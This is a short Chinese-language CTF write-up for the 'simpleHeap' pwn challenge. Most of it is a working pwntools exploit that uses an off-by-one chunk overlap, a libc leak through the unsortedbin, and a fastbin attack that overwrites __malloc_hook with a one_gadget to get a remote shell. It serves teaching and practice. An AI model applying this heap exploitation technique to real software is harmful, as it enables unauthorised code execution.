### simpleHeap

> [附件](vn_pwn_simpleHeap)

1. off by one构造chunk overlap
2. 利用unsortedbin来leak出libc地址
3. fastbin attack修改__malloc_hook的值为onegadget的地址

[exp:](./simpleheap.py)

```
from pwn import *
context.log_level='debug'

def add(size,content):
	p.sendlineafter('choice: ','1')
	p.sendlineafter('size?',str(size))
	p.sendafter('content:',content)


def edit(idx,content):
	p.sendlineafter('choice: ','2')
	p.sendlineafter('idx?',str(idx))
	p.sendlineafter('content:',content)

def show(idx):
	p.sendlineafter('choice: ','3')
	p.sendlineafter('idx?',str(idx))

def free(idx):
	p.sendlineafter('choice: ','4')
	p.sendlineafter('idx?',str(idx))


# p = process('./vn_pwn_simpleHeap')
p = remote('node3.buuoj.cn',27039)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


add(0x18,'\x00') # 0
add(0x58,'\x00') # 1
add(0x68,'\x00') # 2
add(0x10,'\x00') # 3

# chunk overlap
edit(0,'\x00'*0x18+'\xd1')
free(1)


add(0x10,'A') # 1
show(1)
libc_base = u64(p.recv(6).ljust(8,'\x00')) -0x3c4c41
print hex(libc_base)

malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + 0x4526a #
realloc = libc_base + libc.sym['__libc_realloc']

# free fastbin
free(2)

# fd --> malloc_hook -0x23
add(0x50,p64(0)*7+p64(0x71)+p64(malloc_hook-0x23))

# fastbin attack
add(0x68,'\x00')
add(0x68,'\x00'*11+p64(one_gadget)+p64(realloc+14))

# get shell
p.sendlineafter('choice: ','1')
p.sendlineafter('size?',str(10))

#gdb.attach(p)
p.interactive()

# one: 283158 283242 983716 987463
#  0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL%

```